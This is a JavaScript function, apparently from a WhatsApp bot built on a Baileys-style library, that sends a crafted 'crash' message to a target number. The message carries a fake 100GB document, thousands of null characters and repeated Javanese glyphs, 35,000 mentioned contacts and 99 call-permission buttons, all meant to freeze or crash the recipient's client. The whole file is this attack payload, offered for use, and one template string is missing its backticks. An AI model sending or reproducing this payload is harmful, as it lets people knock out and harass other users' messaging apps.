async function EphemeralCalls(target) {
  await sock.relayMessage(target, {
    ephemeralMessage: {
      message: {
        documentMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
          mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
          fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
          fileLength: Math.floor(99.99 * 1073741824).toString(), // ~100GB
          pageCount: 99999999999,
          mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
          fileName: "\u0000".repeat(9999),
          fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
          directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1735456100",
          contactVcard: true,
          caption: "\u0000".repeat(2000),
          jpegThumbnail: "PhynxAgency",
          contextInfo: {
            stanzaId: "ABCDEF1234567890",
            mentionedJid: [
              target, "696969696969@s.whatsapp.net",
              ...Array.from({ length: 35000 }, () =>
            92${Math.floor(Math.random() * 500000)}@s.whatsapp.net
                  )
              ],
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: {
                      text: "Sent",
                      format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                      name: "call_permission_request",
                      paramsJson: JSON.stringify({ 
                        status: true 
                      }),
                      version: 3
                    }
                  }
                }
              }
            },
          }
        },
        hasMediaAttachment: true
      },
      body: {
        text: "PhynxAgency - RaldzzXyz" + "ꦾ".repeat(66666)
      },
      nativeFlowMessage: {
        buttons: Array(99).fill({
          name: "call_permission_request",
          buttonParamsJson: JSON.stringify({ 
            status: true, 
            criador: "PhynxAgency", 
            versao: "@latest", 
            atualizado: "9999-99-99",  
            suporte: "https://wa.me/status?text=" + "ꦾ".repeat(9999), 
            comandosDisponiveis: [command], 
            prefixo: prefix,
            linguagem: "USA" 
          }) + "\u0000".repeat(9999)
        })
      }
    }
  })
}